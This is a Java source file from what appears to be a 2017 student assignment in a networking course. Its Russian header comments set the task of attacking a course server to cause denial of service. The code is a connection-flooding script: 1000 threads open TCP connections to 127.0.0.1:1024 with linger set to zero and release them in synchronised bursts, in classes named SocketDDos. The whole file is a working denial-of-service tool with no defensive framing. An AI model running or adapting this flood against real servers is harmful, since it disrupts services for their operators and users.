//package pavelkorzhenko;

/**
 * @author Pavel Korzhenko
 * @version 0.1 2017/11/11
 * @task 06
 * @mark
 *
 * 1. Разобраться с кодом, показанным на занятии. Модифицировать код SimpleClient так, чтобы клиент мог
 * читать сообщения от сервера.
 * @see SimpleClient
 *
 * 2. *** Написать приложение, атакующее HelloServer так, чтобы вызвать отказ в обслуживании.
 * @see this
 */

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.nio.channels.SocketChannel;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;

public class SocketClient {
    public static  final CyclicBarrier GATE = new CyclicBarrier(5, new YetSocketDDos());

    public static void main(String[] args) throws IOException {
        int numberThread = 1000;
        Thread[] th = new Thread[numberThread];
        for (int i = 0; i < numberThread; i++) {
            th[i] = new Thread(new SocketDDos());
            th[i].start();
        }
        for (int i = 0; i < numberThread; i++) {
            try {
                th[i].join();
            } catch (InterruptedException e) {
                e.printStackTrace();
                return;
            }
        }
    }

    public static class YetSocketDDos implements Runnable {
        @Override
        public void run() {
            System.out.println("Starting yetsocketddos..");

            SocketChannel channel = null;
            try {
                channel = SocketChannel.open();
            } catch (IOException e) {
                e.printStackTrace();
            }
            Socket socket = channel.socket();
            try {
                socket.setTcpNoDelay(true);
            } catch (SocketException e) {
                e.printStackTrace();
            }
            try {
                channel.connect(new InetSocketAddress("127.0.0.1", 1024));
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                channel.finishConnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            System.out.println("Finished yetsocketddos");
        }
    }

    public static class SocketDDos implements Runnable {
        SocketDDos() {

        }
        @Override
        public void run() {
            System.out.println("Starting socketddos");

            SocketChannel channel = null;
            try {
                channel = SocketChannel.open();
            } catch (IOException e) {
                e.printStackTrace();
            }
            Socket socket = channel.socket();
            try {
                socket.setTcpNoDelay(true);
            } catch (SocketException e) {
                e.printStackTrace();
            }
            try {
                socket.setSoLinger(true, 0);
            } catch (SocketException e) {
                e.printStackTrace();
            }
            try {
                channel.connect(new InetSocketAddress("127.0.0.1", 1024));
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                GATE.await();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (BrokenBarrierException e) {
                e.printStackTrace();
            }
            try {
                channel.finishConnect();
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            System.out.println("Finished socketdos");
        }
    }
}
